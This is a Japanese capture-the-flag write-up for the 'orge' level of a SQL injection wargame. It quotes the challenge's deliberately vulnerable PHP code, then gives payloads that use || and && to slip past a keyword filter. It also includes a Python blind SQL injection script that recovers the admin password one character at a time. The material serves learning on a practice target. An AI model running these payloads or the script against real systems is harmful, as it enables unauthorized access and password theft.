# orge

## answer

- [orge](../src/orge.py)

## problem

```
query : select id from prob_orge where id='guest' and pw=''

<?php 
  include "./config.php"; 
  login_chk(); 
  dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  if(preg_match('/or|and/i', $_GET[pw])) exit("HeHe"); 
  $query = "select id from prob_orge where id='guest' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
   
  $_GET[pw] = addslashes($_GET[pw]); 
  $query = "select pw from prob_orge where id='admin' and pw='{$_GET[pw]}'"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("orge"); 
  highlight_file(__FILE__); 
?>
```

## memo

試しに、

```
https://los.eagle-jump.org/orge_40d2b61f694f72448be9c97d1cea2480.php?pw=1
```

とすると

```
query : select id from prob_orge where id='guest' and pw='1'
```

となった。

コードを読んでいく。

```
if(preg_match('/or|and/i', $_GET[pw])) exit("HeHe"); 
```

これは前と同じ。

違う点といえば、

```
$_GET[pw] = addslashes($_GET[pw]); 
$query = "select pw from prob_orge where id='admin' and pw='{$_GET[pw]}'"; 
```

答えが欲しければ最後にはadminでログインする必要あり。

ちなみに、addslashesにより、以下の文字はエスケープされる。

- シングルクォート (')
- ダブルクォート (")
- バックスラッシュ (\\)
- NUL (NULL バイト)

```?pw=1'||id='admin```

これでいく。

```https://los.eagle-jump.org/orge_40d2b61f694f72448be9c97d1cea2480.php?pw=1'%7C%7Cid%3D'admin```

```
query : select id from prob_orge where id='guest' and pw='1'||id='admin'

Hello admin
```

とでた。

どうやら問題は解けてないようだ。

多分```if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("orge");```の後半の条件文がfalseでクリア条件が実行されてない。

もし```$query = "select id from prob_orge where id='guest' and pw='{$_GET[pw]}'"; ```が成功していたら、Hello adminって画面に出してくれるので、BlindSQLiかなと思う。

SUBSTRでエクスプロイトのプロトタイプを作ってみる。空白は禁止されてない。のびのびやろう。


```?pw=1' || SUBSTR(pw,1,1) < 'A' && id='admin```

```?pw=1' || SUBSTR(pw,1,1) > 'A' && id='admin```

この２つで挙動が変わってくれって願いながらやってみる。URLエンコード

```?pw=1'%20%7C%7C%20SUBSTR(pw%2C1%2C1)%20%3C%20'A'%20%26%26%20id%3D'admin```

```?pw=1'%20%7C%7C%20SUBSTR(pw%2C1%2C1)%20%3E%20'A'%20%26%26%20id%3D'admin```

上の方のエクスプロイトのみ```Hello Admin```を返す。

どうやらいけそう。

じゃあ、コードを書いていくぜ。


```
#!/usr/bin/python3
# coding : UTF-8

import sys
import requests
import time

def main():
    url = "https://los.eagle-jump.org/orge_40d2b61f694f72448be9c97d1cea2480.php"
    ua = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36'
    headers = {'User-Agent': ua}
    cookies = dict(PHPSESSID='XXXXXXXXXXXXXXXXXXXXXXXX')

    chars = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
    password = ""
    for count in range(1, 10):
        for char in chars:
            val = '1\' || SUBSTR(pw,{count},1)=\'{char}\' && id = \'admin'.format(count = count, char = char)
            params = {'pw': val}
            response = requests.get(url, headers=headers, params=params, cookies=cookies, allow_redirects=False)
            if response.text.count("Hello admin") == 1:
                password += char
                print(password)
                break
            if char == 'Z':
                print("not found")
                return
            time.sleep(0.1)
    print(password)

if __name__ == "__main__":
    main()
```

## supplementary

これも前に言ったかもだけど、先にパスワードの長さを取得するのもスタンダードらしいっす。

```
?pw=1' || length(pw)=8 && id='admin
```

こんな感じかな？

## references

- [preg_match | php manual](https://www.php.net/manual/ja/function.preg-match.php)

- [mysql_fetch_array | php manual](https://www.php.net/manual/ja/function.mysql-fetch-array.php)

- [mysql_query | php manual](https://www.php.net/manual/ja/function.mysql-query.php)

- [addslashed | php manual](https://www.php.net/manual/ja/function.addslashes.php)

- [highlight_file | php manual](https://www.php.net/manual/ja/function.highlight-file.php)

- [論理演算子 | MySQL manual](https://dev.mysql.com/doc/refman/5.6/ja/logical-operators.html)